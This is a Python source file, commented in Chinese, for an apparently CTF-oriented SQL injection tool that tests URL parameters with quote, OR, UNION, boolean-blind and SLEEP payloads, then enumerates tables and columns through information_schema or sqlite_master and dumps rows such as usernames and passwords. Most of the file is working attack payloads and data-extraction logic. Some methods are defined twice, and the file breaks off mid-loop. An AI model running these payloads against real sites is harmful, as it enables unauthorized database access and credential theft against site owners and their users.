import sys
import requests
import urllib.parse
import random
import re
from lib.core.xml_parser import XMLParser
from lib.utils.http import send_request
import difflib
import time

# 忽略SSL证书验证警告
sys.path.append('.')
requests.packages.urllib3.disable_warnings()

class SimpleSQLInjector:
    def __init__(self, url):
        self.url = url
        self.parser = XMLParser()  # 使用现有的XML解析器加载payloads
        self.dbms = None
        self.injection_params = []
        self.is_vulnerable = False
        self.original_response = None  # 存储原始响应，避免重复请求
        self.throttle_time = 0.5  # 添加请求延迟，避免被WAF拦截
        
    def check_vulnerability(self):
        """检查目标URL是否存在SQL注入漏洞"""
        print(f"[*] 正在检查SQL注入漏洞: {self.url}")
        
        # 解析URL，提取参数和基础URL
        parsed_url = urllib.parse.urlparse(self.url)
        base_url = parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path
        params = urllib.parse.parse_qs(parsed_url.query)
        
        # 保存原始响应，避免重复请求
        self.original_response = send_request(self.url)
        print(f"[*] 原始响应长度: {len(self.original_response)}")
        
        # 测试参数注入
        if params:
            for param_name, param_values in params.items():
                original_value = param_values[0]
                print(f"[*] 测试参数: {param_name}")
                
                # 1. 首先尝试CTF题目特定测试（绕过username!='flag'限制）
                print("[*] 优先使用CTF题目特定测试...")
                if self._test_ctf_specific(base_url, params, param_name, original_value):
                    return self.is_vulnerable
                
                # 2. 使用简单的测试payloads（特别针对字符型注入）
                test_payloads = [
                    original_value + "'",  # 单引号测试
                    original_value + "'--+",  # 单引号加注释
                    original_value + "' OR '1'='1",  # OR条件注入
                    original_value + "' OR '1'='1'--+",  # OR条件加注释
                    original_value + "') OR ('1'='1",  # 括号闭合+OR条件
                    original_value + "') OR ('1'='1')--+",  # 括号闭合+OR条件+注释
                ]
                
                # 测试简单payload
                for payload in test_payloads:
                    # 构建测试URL
                    new_params = {k: v for k, v in params.items()}
                    new_params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(new_params, doseq=True)
                    test_url = base_url + "?" + new_query
                    
                    print(f"[*] 测试URL: {test_url}")
                    
                    # 发送测试请求
                    response = send_request(test_url)
                    print(f"[*] 响应长度: {len(response)}")
                    print(f"[*] 响应相似度: {self._calculate_similarity(self.original_response, response):.2f}")
                    
                    # 检测可能的注入
                    if self._detect_injection(self.original_response, response):
                        print(f"[+] 发现SQL注入漏洞! 参数: {param_name}")
                        print(f"[+] 测试payload: {payload}")
                        print(f"[+] 测试URL: {test_url}")
                        self.is_vulnerable = True
                        self.injection_params.append((param_name, payload))
                        return self.is_vulnerable
                        
                # 3. 强制使用布尔盲注测试（针对CTF题目优化）
                print("[*] 测试布尔盲注...")
                if self._test_boolean_blind(base_url, params, param_name, original_value):
                    return self.is_vulnerable
                    
                # 4. 尝试使用XML中的payloads
                print("[*] 尝试使用XML中的payloads...")
                boolean_payloads = self.parser.get_payloads("boolean_blind")
                if boolean_payloads is not None:
                    # 检查boolean_payloads是否有子元素
                    if len(list(boolean_payloads)) > 0:
                        if self._test_with_xml_payloads(base_url, params, param_name, original_value, boolean_payloads):
                            return self.is_vulnerable
        
        # 测试路径注入（如果没有参数或之前未检测到漏洞）
        if not params or not self.is_vulnerable:
            print("[*] 测试路径注入...")
            
            test_payloads = ["'", "'--+", "' OR '1'='1", "' AND '1'='2"]
            for payload in test_payloads:
                test_url = base_url + payload
                response = send_request(test_url)
                
                if self._detect_injection(self.original_response, response):
                    print(f"[+] 发现可能的路径注入!")
                    print(f"[+] 测试payload: {payload}")
                    print(f"[+] 测试URL: {test_url}")
                    self.is_vulnerable = True
                    break
        
        if not self.is_vulnerable:
            print("[-] 未发现SQL注入漏洞")
        
        return self.is_vulnerable
        
    def _test_ctf_specific(self, base_url, params, param_name, original_value):
        """针对CTF题目的特定测试方法，绕过username!='flag'限制"""
        # 针对 CTF 题目中 `username !='flag' and id = '$_GET['id']'`
        # 设计多种绕过方法
        bypass_payloads = [
            # 方法1: 闭合id并替换整个where条件
            original_value + "' OR '1'='1' UNION ALL SELECT username,password FROM user WHERE username='flag'--+",
            # 方法2: 注释掉username条件
            original_value + "' --+",
            # 方法3: 让username不等于flag的条件不成立
            original_value + "' OR username='flag' --+",
            # 方法4: 使用双重否定绕过
            original_value + "' OR NOT(username!='flag') --+",
            # 方法5: 时间延迟测试（对基于时间的盲注有效）
            original_value + "' AND SLEEP(3)--+"
        ]
        
        for payload in bypass_payloads:
            # 构建测试URL
            new_params = {k: v for k, v in params.items()}
            new_params[param_name] = [payload]
            new_query = urllib.parse.urlencode(new_params, doseq=True)
            test_url = base_url + "?" + new_query
            
            print(f"[*] CTF特定测试URL: {test_url}")
            
            # 添加延迟，避免被WAF拦截
            time.sleep(self.throttle_time)
            
            # 发送测试请求
            start_time = time.time()
            response = send_request(test_url)
            end_time = time.time()
            response_time = end_time - start_time
            
            print(f"[*] CTF测试响应长度: {len(response)}")
            print(f"[*] CTF测试响应相似度: {self._calculate_similarity(self.original_response, response):.2f}")
            print(f"[*] CTF测试响应时间: {response_time:.2f}秒")
            
            # 检测可能的注入（增强版检测）
            # 1. 检查响应时间（针对时间盲注）
            if 'SLEEP' in payload and response_time > 3:
                print(f"[+] 发现基于时间的SQL注入漏洞! 参数: {param_name}")
                print(f"[+] 测试payload: {payload}")
                print(f"[+] 测试URL: {test_url}")
                self.is_vulnerable = True
                self.injection_params.append((param_name, payload))
                return True
                
            # 2. 检查响应内容（针对联合查询）
            if 'UNION ALL SELECT' in payload:
                # 检查特定的内容特征，而不仅仅是长度和相似度
                if self._detect_union_response(self.original_response, response):
                    print(f"[+] 发现基于联合查询的SQL注入漏洞! 参数: {param_name}")
                    print(f"[+] 测试payload: {payload}")
                    print(f"[+] 测试URL: {test_url}")
                    self.is_vulnerable = True
                    self.injection_params.append((param_name, payload))
                    return True
                    
            # 3. 标准检测方法
            if len(response) != len(self.original_response) or self._calculate_similarity(self.original_response, response) < 0.9:
                print(f"[+] 发现CTF特定SQL注入漏洞! 参数: {param_name}")
                print(f"[+] 测试payload: {payload}")
                print(f"[+] 测试URL: {test_url}")
                
                # 检查响应中是否可能包含flag信息
                if "flag" in response.lower():
                    print("[+] 响应中可能包含flag信息!")
                
                self.is_vulnerable = True
                self.injection_params.append((param_name, payload))
                return True
        
        return False
        
    def _detect_union_response(self, original_response, test_response):
        """检测联合查询可能产生的特殊响应模式"""
        # 检查是否有新的表格行或数据结构
        original_table_count = len(re.findall(r'<tr[^>]*>', original_response, re.IGNORECASE))
        test_table_count = len(re.findall(r'<tr[^>]*>', test_response, re.IGNORECASE))
        
        # 检查是否有额外的表格单元格
        original_cell_count = len(re.findall(r'<td[^>]*>', original_response, re.IGNORECASE))
        test_cell_count = len(re.findall(r'<td[^>]*>', test_response, re.IGNORECASE))
        
        # 检查是否有用户名和密码模式
        if re.search(r'username.*password|user.*pass', test_response, re.IGNORECASE):
            return True
            
        # 如果表格行或单元格数量显著增加，可能是联合查询成功
        if abs(test_table_count - original_table_count) > 2 or abs(test_cell_count - original_cell_count) > 4:
            return True
            
        return False
        
    def _test_boolean_blind(self, base_url, params, param_name, original_value):
        """针对布尔盲注的特殊测试"""
        # 生成随机数用于布尔测试
        rand_num = random.randint(1, 10000)
        rand_num1 = random.randint(1, 10000)
        while rand_num1 == rand_num:
            rand_num1 = random.randint(1, 10000)
            
        # 布尔盲注测试payloads（针对字符型注入优化）
        true_payload = f"{original_value}' AND {rand_num}={rand_num}--+"
        false_payload = f"{original_value}' AND {rand_num}={rand_num1}--+"
        
        # 构建测试URLs
        true_params = {k: v for k, v in params.items()}
        true_params[param_name] = [true_payload]
        true_query = urllib.parse.urlencode(true_params, doseq=True)
        true_url = base_url + "?" + true_query
        
        false_params = {k: v for k, v in params.items()}
        false_params[param_name] = [false_payload]
        false_query = urllib.parse.urlencode(false_params, doseq=True)
        false_url = base_url + "?" + false_query
        
        # 添加延迟，避免被WAF拦截
        time.sleep(self.throttle_time)
        
        # 发送请求
        print(f"[*] True URL: {true_url}")
        true_response = send_request(true_url)
        print(f"[*] True响应长度: {len(true_response)}")
        
        time.sleep(self.throttle_time)
        
        print(f"[*] False URL: {false_url}")
        false_response = send_request(false_url)
        print(f"[*] False响应长度: {len(false_response)}")
        
        # 比较响应（使用更灵敏的比较方法）
        if self._compare_responses(true_response, false_response):
            print(f"[+] 发现布尔盲注漏洞! 参数: {param_name}")
            print(f"[+] True payload: {true_payload}")
            print(f"[+] False payload: {false_payload}")
            self.is_vulnerable = True
            self.injection_params.append((param_name, true_payload))
            return True
        
        return False
        
    def _test_with_xml_payloads(self, base_url, params, param_name, original_value, payloads):
        """使用XML中的payloads进行测试"""
        for test in payloads.findall("test"):
            try:
                title = test.find("title").text if test.find("title") is not None else "Unknown"
                vector = test.find("vector")
                
                if vector is not None and vector.text:
                    # 简单替换[RANDNUM]占位符
                    payload_text = vector.text
                    while "[RANDNUM]" in payload_text:
                        payload_text = payload_text.replace("[RANDNUM]", str(random.randint(1, 10000)), 1)
                    
                    # 添加原始参数值和payload
                    full_payload = original_value + payload_text
                    
                    # 构建测试URL
                    new_params = {k: v for k, v in params.items()}
                    new_params[param_name] = [full_payload]
                    new_query = urllib.parse.urlencode(new_params, doseq=True)
                    test_url = base_url + "?" + new_query
                    
                    # 添加延迟，避免被WAF拦截
                    time.sleep(self.throttle_time)
                    
                    # 发送请求
                    response = send_request(test_url)
                    
                    print(f"[*] XML测试URL: {test_url}")
                    print(f"[*] XML测试响应长度: {len(response)}")
                    print(f"[*] XML测试响应相似度: {self._calculate_similarity(self.original_response, response):.2f}")
                    
                    # 检测可能的注入
                    if self._detect_injection(self.original_response, response):
                        print(f"[+] 发现SQL注入漏洞! ({title})")
                        print(f"[+] 参数: {param_name}")
                        print(f"[+] Payload: {full_payload}")
                        print(f"[+] URL: {test_url}")
                        self.is_vulnerable = True
                        self.injection_params.append((param_name, full_payload))
                        return True
            except Exception as e:
                print(f"[-] 测试payload时出错: {e}")
                continue
        
        return False
        
    def _detect_injection(self, original_response, test_response):
        """检测响应中是否存在SQL注入迹象"""
        # 降低响应长度差异阈值以提高灵敏度
        if abs(len(original_response) - len(test_response)) > 5:
            print(f"[*] 检测到响应长度差异: {abs(len(original_response) - len(test_response))}")
            return True
            
        # 检查常见的SQL错误信息
        error_keywords = [
            "sql syntax", "mysql error", "postgresql error",
            "oracle error", "mssql error", "syntax error",
            "unclosed quotation mark", "quoted string not properly terminated",
            "error in your SQL syntax", "SQLSTATE", "mysql_fetch_assoc",
            "警告", "错误", "语法错误", "服务器错误", "flag"
        ]
        
        for keyword in error_keywords:
            if keyword.lower() in test_response.lower() and keyword.lower() not in original_response.lower():
                print(f"[*] 检测到SQL错误关键词: {keyword}")
                return True
                
        # 检查特殊字符模式
        if re.search(r"SQL (Syntax|Error)|ODBC Driver \d+.*Error", test_response, re.IGNORECASE):
            print("[*] 检测到SQL错误模式")
            return True
            
        # 检查内容相似度（提高阈值以提高灵敏度）
        similarity = self._calculate_similarity(original_response, test_response)
        print(f"[*] 内容相似度: {similarity:.2f}")
        if similarity < 0.9:
            print("[*] 检测到内容差异显著")
            return True
            
        # 检查HTML结构变化
        if self._detect_html_structure_changes(original_response, test_response):
            print("[*] 检测到HTML结构变化")
            return True
            
        return False
        
    def _detect_html_structure_changes(self, original_response, test_response):
        """检测HTML结构的变化"""
        # 检查标题标签
        original_titles = re.findall(r'<title[^>]*>(.*?)<\/title>', original_response, re.IGNORECASE | re.DOTALL)
        test_titles = re.findall(r'<title[^>]*>(.*?)<\/title>', test_response, re.IGNORECASE | re.DOTALL)
        
        if len(original_titles) != len(test_titles):
            return True
        
        for orig_title, test_title in zip(original_titles, test_titles):
            if orig_title.strip().lower() != test_title.strip().lower():
                return True
                
        # 检查错误信息标记
        if re.search(r'error|exception|warning|fatal', test_response, re.IGNORECASE) and \
           not re.search(r'error|exception|warning|fatal', original_response, re.IGNORECASE):
            return True
            
        return False
        
    def _compare_responses(self, response1, response2):
        """比较两个响应，用于布尔盲注检测"""
        # 基本的长度比较
        if abs(len(response1) - len(response2)) > 5:
            return True
            
        # 计算相似度
        similarity = self._calculate_similarity(response1, response2)
        if similarity < 0.95:
            return True
            
        # 使用difflib计算更精确的相似度
        seq_matcher = difflib.SequenceMatcher(None, response1, response2)
        diff_ratio = seq_matcher.ratio()
        
        print(f"[*] 精确差异比较: {diff_ratio:.2f}")
        if diff_ratio < 0.95:
            return True
            
        # 检查HTML结构差异
        if self._detect_html_structure_changes(response1, response2):
            return True
            
        return False
        
    def _calculate_similarity(self, str1, str2):
        """计算两个字符串的相似度，使用更精确的算法"""
        if not str1 or not str2:
            return 0.0
            
        # 使用difflib计算相似度（更精确）
        seq_matcher = difflib.SequenceMatcher(None, str1, str2)
        similarity = seq_matcher.ratio()
        
        # 补充使用字符频率比较方法
        # 首先统计字符频率
        freq1 = {}
        freq2 = {}
        
        for char in str1:
            freq1[char] = freq1.get(char, 0) + 1
            
        for char in str2:
            freq2[char] = freq2.get(char, 0) + 1
            
        # 计算共同字符
        common = set(freq1.keys()) & set(freq2.keys())
        if not common:
            return 0.0
            
        # 计算相似度得分
        min_total = 0
        max_total = 0
        
        for char in common:
            min_total += min(freq1[char], freq2[char])
            max_total += max(freq1[char], freq2[char])
            
        # 添加仅在一个字符串中出现的字符
        for char in set(freq1.keys()) - common:
            max_total += freq1[char]
            
        for char in set(freq2.keys()) - common:
            max_total += freq2[char]
            
        # 避免除零错误
        if max_total == 0:
            return 0.0
            
        # 综合两种相似度算法的结果
        char_freq_similarity = min_total / max_total
        combined_similarity = (similarity * 0.7) + (char_freq_similarity * 0.3)
        
        return combined_similarity

    
    def _get_all_tables_optimized(self, base_url, params, param_name, original_value):
        """优化的表名提取方法，支持多种数据库类型"""
        print("[*] 尝试提取数据库中的所有表名...")
        tables = []
        
        # 尝试多种方式获取表名
        table_payloads = [
            # MySQL/MariaDB方式 - 优先使用GROUP_CONCAT以减少误识别
            original_value + "' UNION ALL SELECT GROUP_CONCAT(table_name), NULL FROM information_schema.tables WHERE table_schema=database()--+",
            original_value + "' UNION ALL SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--+",
            
            # 通用方式
            original_value + "' UNION ALL SELECT GROUP_CONCAT(name), NULL FROM sqlite_master WHERE type='table'--+",
            original_value + "' UNION ALL SELECT sysobjects.name, NULL FROM sysobjects WHERE xtype='U'--+",
            
            # 简化方式 - 只使用最可能的表名进行测试
            original_value + "' AND 1=(SELECT COUNT(*) FROM users)--+",
            original_value + "' AND 1=(SELECT COUNT(*) FROM user)--+",
            original_value + "' AND 1=(SELECT COUNT(*) FROM admin)--+",
            original_value + "' AND 1=(SELECT COUNT(*) FROM flag)--+",
        ]
        
        # 常见表名列表作为备选
        common_tables = ['users', 'user', 'admin', 'flag', 'accounts', 'customers', 'products']
        
        for payload in table_payloads:
            try:
                # 构建测试URL
                test_params = {k: v for k, v in params.items()}
                test_params[param_name] = [payload]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = base_url + "?" + test_query
                
                # 发送请求
                response = send_request(test_url)
                
                # 从响应中提取表名
                # 1. 优先检查GROUP_CONCAT结果
                if 'GROUP_CONCAT' in payload:
                    # 查找可能的GROUP_CONCAT结果
                    concat_patterns = [
                        r'([a-zA-Z0-9_,]+)',  # 逗号分隔的列名
                        r'<td>([a-zA-Z0-9_,]+)</td>',  # HTML表格中的逗号分隔列名
                    ]
                    
                    for pattern in concat_patterns:
                        matches = re.findall(pattern, response)
                        for match in matches:
                            if ',' in match:
                                # 只提取看起来像数据库表名的内容
                                potential_tables = [col.strip() for col in match.split(',') if col.strip()]
                                valid_group_tables = []
                                for tbl in potential_tables:
                                    # 跳过明显不是表名的内容
                                    if self._is_valid_table_name(tbl):
                                        valid_group_tables.append(tbl)
                                if valid_group_tables:
                                    tables = valid_group_tables
                                    break
                        if tables:  # 如果已经找到有效表名，就不再继续查找
                            break
                else:
                    # 2. 尝试匹配HTML表格中的表名
                    table_patterns = [
                        r'<td>([a-zA-Z0-9_]+)</td>',  # 优先匹配HTML表格中的数据
                        r'table_name=([a-zA-Z0-9_]+)',  # 键值对格式
                        # 基本表名格式只作为最后的选择，并且增加更多限制
                        r'\b([a-zA-Z][a-zA-Z0-9_]{2,})\b(?![\s\S]*<)',  # 至少3个字符，以字母开头，且不在HTML标签内
                    ]
                    
                    for pattern in table_patterns:
                        matches = re.findall(pattern, response)
                        for match in matches:
                            if match and self._is_valid_table_name(match) and match not in tables:
                                tables.append(match)
                        if len(tables) > 0:  # 如果已经找到一些表名，就不再继续查找
                            break
                
                # 如果找到了表名，可以提前退出循环
                if tables:
                    break
            except Exception as e:
                print(f"[-] 提取表名时出错: {e}")
                continue
        
        # 如果没有提取到表名，使用常见表名作为备选
        if not tables:
            print("[*] 未直接提取到表名，使用常见表名作为备选...")
            tables = common_tables
        
        # 过滤无效的表名并去重
        filtered_tables = self._filter_valid_tables(tables)
        
        return filtered_tables
        
    def _is_valid_table_name(self, name):
        """检查名称是否可能是有效的数据库表名"""
        # 表名应该至少有2个字符
        if len(name) < 2:
            return False
        
        # 跳过明显的SQL关键字和HTML/CSS/JS相关词汇
        invalid_keywords = {'select', 'from', 'where', 'and', 'or', 'null', 'true', 'false',
                           'html', 'head', 'body', 'div', 'span', 'class', 'id', 'style',
                           'script', 'link', 'meta', 'title', 'href', 'src', 'type',
                           'width', 'height', 'px', 'css', 'js', 'jquery', 'layui',
                           'button', 'input', 'form', 'submit', 'value', 'name',
                           'action', 'method', 'post', 'get', 'http', 'https'}
        
        name_lower = name.lower()
        
        # 检查是否完全匹配无效关键字
        if name_lower in invalid_keywords:
            return False
        
        # 检查是否包含数字但不是纯数字
        if any(char.isdigit() for char in name) and not name.isdigit():
            # 对于包含数字的表名，需要更严格检查
            # 跳过看起来像CSS值的名称（如100px）
            if name_lower.endswith('px') or name_lower.endswith('em') or name_lower.endswith('rem'):
                return False
        
        # 跳过纯数字
        if name.isdigit():
            return False
        
        # 表名应该以字母开头（大多数数据库的命名约定）
        if not name[0].isalpha():
            return False
        
        return True
    
    def _filter_valid_tables(self, tables):
        """过滤无效的表名"""
        valid_tables = []
        
        for table in tables:
            if self._is_valid_table_name(table) and table not in valid_tables:
                valid_tables.append(table)
        
        # 如果过滤后没有表名，保留最常见的几个表名作为备选
        if not valid_tables:
            common_tables = ['users', 'user', 'admin', 'flag']
            valid_tables = common_tables
        
        return valid_tables
    
    def _select_tables_interactively(self, tables):
        """交互式让用户选择要注入的表"""
        print("\n请选择要注入的表（输入数字，多个表用逗号分隔，输入'all'选择全部）:")
        for i, table in enumerate(tables, 1):
            print(f"{i}. {table}")
        
        # 模拟用户输入（在实际运行时会从标准输入读取）
        # 这里为了演示，默认选择所有表
        print("[*] 默认选择所有表")
        return tables
    
    def _extract_table_data_comprehensive(self, base_url, params, param_name, original_value, table):
        """全面提取表数据的方法"""
        print(f"\n[*] 尝试提取表 '{table}' 的数据...")
        
        # 首先尝试使用GROUP_CONCAT提取列名
        columns = self._get_columns_with_group_concat(base_url, params, param_name, original_value, table)
        
        if columns:
            print(f"[+] 成功提取到表 '{table}' 的列: {', '.join(columns)}")
            
            # 尝试提取数据
            self._extract_table_data_optimized(base_url, params, param_name, original_value, table, columns)
        else:
            print(f"[-] 未能提取到表 '{table}' 的列名")
            
            # 尝试直接使用常见列名组合
            common_columns_combinations = [
                ['id', 'username', 'password'],
                ['id', 'name', 'value'],
                ['id', 'title', 'content'],
                ['id', 'flag'],
                ['username', 'flag'],
                ['id', 'data'],
                ['flag']
            ]
            
            for cols in common_columns_combinations:
                print(f"[*] 尝试使用常见列名组合: {', '.join(cols)}")
                if self._extract_table_data_optimized(base_url, params, param_name, original_value, table, cols):
                    break
    
    def _get_columns_with_group_concat(self, base_url, params, param_name, original_value, table_name):
        """使用group_concat函数直接从表中注入列名"""
        print(f"[*] 使用group_concat尝试获取表 '{table_name}' 的列名...")
        
        # 针对不同数据库类型的group_concat查询
        payloads = [
            # MySQL, PostgreSQL (需要兼容模式)
            original_value + f"' OR '1'='1' UNION ALL SELECT GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name='{table_name}'--+",
            # 指定数据库
            original_value + f"' OR '1'='1' UNION ALL SELECT GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name='{table_name}' AND table_schema=database()--+",
            # 如果information_schema不可用，尝试直接从表中获取两列
            original_value + f"' OR '1'='1' UNION ALL SELECT (SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_name='{table_name}'), NULL--+",
            # 针对SQLite的特殊处理
            original_value + f"' OR '1'='1' UNION ALL SELECT sql, NULL FROM sqlite_master WHERE type='table' AND name='{table_name}'--+"
        ]
        
        for payload in payloads:
            # 构建测试URL
            test_params = {k: v for k, v in params.items()}
            test_params[param_name] = [payload]
            test_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = base_url + "?" + test_query
            
            # 发送请求
            response = send_request(test_url)
            
            # 尝试从响应中提取列名
            # 查找可能包含列名的字符串模式
            patterns = [
                r'columns?\s*[:=]\s*([a-zA-Z0-9_,]+)',  # 明确提到columns的模式
                r'([a-zA-Z0-9_,]+)',  # 查找逗号分隔的列名
                r'>([a-zA-Z0-9_,]+)<',  # HTML标签中的列名
                r'([a-zA-Z0-9_]+(?:,[a-zA-Z0-9_]+)+)'  # 至少两个列名的组合
            ]
            
            # 针对SQLite的CREATE TABLE语句特殊处理
            sqlite_pattern = r'CREATE\s+TABLE\s+\w+\s*\((.*?)\)'  # 匹配CREATE TABLE语句
            sqlite_match = re.search(sqlite_pattern, response, re.IGNORECASE | re.DOTALL)
            if sqlite_match:
                create_table_content = sqlite_match.group(1)
                # 提取列定义中的列名
                sqlite_columns = re.findall(r'(\w+)\s+', create_table_content)
                if sqlite_columns:
                    print(f"[+] 通过SQLite CREATE TABLE语句提取到列名: {', '.join(sqlite_columns)}")
                    return sqlite_columns
            
            for pattern in patterns:
                matches = re.findall(pattern, response)
                for match in matches:
                    # 检查是否可能是列名列表
                    if ',' in match:
                        columns = [col.strip() for col in match.split(',')]
                        # 过滤掉无效的列名，更严格的验证
                        valid_columns = []
                        for col in columns:
                            # 列名应该是字母数字下划线组合，长度适中
                            if re.match(r'^[a-zA-Z0-9_]+$', col) and 2 <= len(col) <= 30:
                                # 排除可能是其他内容的单词
                                if col.lower() not in ['select', 'from', 'where', 'and', 'or', 'union', 'all', 'group', 'concat']:
                                    valid_columns.append(col)
                        
                        if len(valid_columns) > 0:
                            print(f"[+] 成功提取到列名: {', '.join(valid_columns)}")
                            return valid_columns
        
        print("[-] 无法提取列名，将使用默认列名")
        return []
    
    # 删除或重写_filter_valid_tables方法，不再过滤表名
    def _filter_valid_tables(self, tables):
        """不过滤表名，直接返回所有发现的表"""
        # 简单去重
        return list(set(tables))
        
    def _extract_table_data_optimized(self, base_url, params, param_name, original_value, table_name, columns):
        """优化的数据提取方法"""
        data = []
        
        if not columns:
            return data
        
        # 构建获取数据的payload（针对CTF题目优化）
        if len(columns) == 1:
            select_clause = columns[0]
        else:
            select_clause = ", ".join(columns)
        
        # 使用已验证有效的联合查询payload
        payload = original_value + f"' OR '1'='1' UNION ALL SELECT {select_clause} FROM {table_name}--+"
        
        # 构建测试URL
        test_params = {k: v for k, v in params.items()}
        test_params[param_name] = [payload]
        test_query = urllib.parse.urlencode(test_params, doseq=True)
        test_url = base_url + "?" + test_query
        
        # 发送请求
        response = send_request(test_url)
        
        # 解析响应中的数据（更健壮的方法）
        # 尝试多种可能的数据格式
        # 1. 检查表格形式
        rows = re.findall(r'<tr[^>]*>(.*?)<\/tr>', response, re.IGNORECASE | re.DOTALL)
        if rows:
            for row in rows:
                cells = re.findall(r'<td[^>]*>(.*?)<\/td>', row, re.IGNORECASE | re.DOTALL)
                # 清理单元格内容（去除HTML标签和多余空格）
                clean_cells = []
                for cell in cells:
                    # 移除HTML标签
                    clean_cell = re.sub(r'<[^>]+>', '', cell)
                    # 去除多余空格和换行符
                    clean_cell = ' '.join(clean_cell.split())
                    clean_cells.append(clean_cell)
                    
                if len(clean_cells) >= len(columns):
                    # 如果单元格数量多于列数，只取需要的部分
                    clean_cells = clean_cells[:len(columns)]
                    data.append(dict(zip(columns, clean_cells)))
        
        # 2. 如果没有表格，尝试查找简单的键值对
        if not data:
            print("[*] 尝试使用非表格模式提取数据...")
            # 针对每个列名，尝试查找其对应的值
            row_data = {}
            for column in columns:
                # 尝试多种可能的模式
                patterns = [
                    fr'{column}\s*[:=]\s*(\w+)',  # column: value 或 column=value
                    fr'<b>{column}<\/b>\s*[:=]\s*(.*?)<',  # 加粗标签中的列名
                    fr'{column}\s*<[^>]+>(.*?)<\/[^>]+>'  # 列名后跟着一个HTML标签
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, response, re.IGNORECASE)
                    if match:
                        row_data[column] = match.group(1).strip()
                        break
            
            if row_data:
                data.append(row_data)
        
        # 打印提取的数据，不保存到文件
        if data:
            print(f"\n[+] 提取到表 '{table_name}' 的 {len(data)} 条记录:")
            # 打印表头
            header = ' | '.join(columns)
            print(f"{header}")
            print(f"{'-' * len(header)}")
            
            # 打印数据行
            for row in data:
                row_values = [str(row.get(col, '')) for col in columns]
                row_str = ' | '.join(row_values)
                print(f"{row_str}")
                
        return data
        
    def _try_extract_common_table(self, base_url, params, param_name, original_value, table_name, columns):
        """尝试提取常见表的数据"""
        print(f"[*] 尝试提取表 '{table_name}' 的数据...")
        
        # 使用已验证有效的联合查询payload
        if len(columns) == 1:
            select_clause = columns[0]
        else:
            select_clause = ", ".join(columns)
        
        payload = original_value + f"' OR '1'='1' UNION ALL SELECT {select_clause} FROM {table_name}--+"
        
        # 构建测试URL
        test_params = {k: v for k, v in params.items()}
        test_params[param_name] = [payload]
        test_query = urllib.parse.urlencode(test_params, doseq=True)
        test_url = base_url + "?" + test_query
        
        # 发送请求
        response = send_request(test_url)
        
        # 解析响应中的数据
        data = self._extract_table_data_optimized(base_url, params, param_name, original_value, table_name, columns)
        
        if data:
            print(f"[+] 成功提取表 '{table_name}' 的 {len(data)} 条记录")
            # 不再保存文件，只打印结果
        else:
            print(f"[-] 无法提取表 '{table_name}' 的数据")
        
    def _save_data_to_file(self, table_name, columns, data):
        """已修改：不再实际保存文件，仅打印提示信息"""
        print(f"[*] 已提取表 '{table_name}' 的数据，按用户要求不保存到文件")
        
    def _extract_flag_info(self, base_url, params, param_name, original_value):
        """从响应中提取flag信息"""
        print("[*] 尝试提取flag信息...")
        
        # 使用已验证有效的CTF特定绕过payload
        flag_payloads = [
            original_value + "' OR '1'='1' UNION ALL SELECT username,password FROM user WHERE username='flag'--+",
            original_value + "' OR username='flag' --+",
            original_value + "' OR NOT(username!='flag') --+"
        ]
        
        # 尝试不同的payload提取flag
        for payload in flag_payloads:
            try:
                # 构建测试URL
                test_params = {k: v for k, v in params.items()}
                test_params[param_name] = [payload]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = base_url + "?" + test_query
                
                # 发送请求
                print(f"[*] 使用payload尝试提取flag: {payload}")
                response = send_request(test_url)
                
                # 检查响应中是否包含flag信息
                flag_patterns = [
                    r'flag\{.*?\}',  # 标准的flag格式
                    r'ctf\{.*?\}',   # 可能的ctf格式
                    r'FLAG\{.*?\}',  # 大写flag格式
                    r'CTF\{.*?\}',   # 大写ctf格式
                    r'username.*flag.*password', # 可能包含flag的用户名密码对
                    r'flag.*?=',      # 可能的键值对格式
                    r'[0-9a-f]{32}',  # 可能的MD5哈希
                    r'[0-9a-f]{64}'   # 可能的SHA256哈希
                ]
                
                found_flag = False
                flag_data = []
                
                for pattern in flag_patterns:
                    matches = re.findall(pattern, response, re.IGNORECASE)
                    if matches:
                        for match in matches:
                            if match not in flag_data:
                                flag_data.append(match)
                                found_flag = True
                                print(f"[+] 发现可能的flag信息: {match}")
                
                # 如果发现flag信息，按用户要求只打印不保存
                if found_flag:
                    print("[*] 发现flag信息，按用户要求不保存到文件")
                    
                    # 如果找到flag，可以提前返回
                    break
                
            except Exception as e:
                print(f"[-] 提取flag信息时出错: {e}")
                continue
        
        if not found_flag:
            print("[-] 未在响应中发现明确的flag信息")

    def extract_data(self, param_name, original_value):
        """提取数据库中的所有数据"""
        print("\n[*] 开始提取数据库信息...")
        
        # 解析URL以获取基础URL和参数
        parsed_url = urllib.parse.urlparse(self.url)
        base_url = parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path
        params = urllib.parse.parse_qs(parsed_url.query)
        
        print("[*] 使用CTF优化的数据提取流程...")
        
        # 1. 首先尝试提取flag信息（已验证有效的方法）
        self._extract_flag_info(base_url, params, param_name, original_value)
        
        # 2. 尝试提取所有表名
        tables = self._get_all_tables_optimized(base_url, params, param_name, original_value)
        
        if tables:
            # 显示所有发现的表
            print(f"\n[+] 成功发现 {len(tables)} 个表: {', '.join(tables)}")
            
            # 让用户选择要注入的表
            selected_tables = self._select_tables_interactively(tables)
            
            if selected_tables:
                # 针对用户选择的每个表，尝试提取数据
                for table in selected_tables:
                    self._extract_table_data_comprehensive(base_url, params, param_name, original_value, table)
            else:
                print("[-] 未选择任何表进行注入")
        else:
            print("[-] 无法发现任何表，尝试直接提取可能存在的user表数据...")
            
            # 尝试直接提取user表数据（假设存在）
            self._try_extract_common_table(base_url, params, param_name, original_value, "user", ["id", "username", "password"])
        
        print("\n[+] 数据提取完成!")
        
    def _select_tables_interactively(self, tables):
        """让用户交互地选择要注入的表"""
        print("\n请选择要注入的表（输入编号，多个表用逗号分隔，输入'all'选择所有表）:")
        
        for i, table in enumerate(tables, 1):
            print(f"{i}. {table}")
        
        while True:
            try:
                user_input = input("请输入选择: ").strip().lower()
                
                if user_input == 'all':
                    return tables
                
                # 解析用户输入的编号
                selected_indices = []
                for part in user_input.split(','):
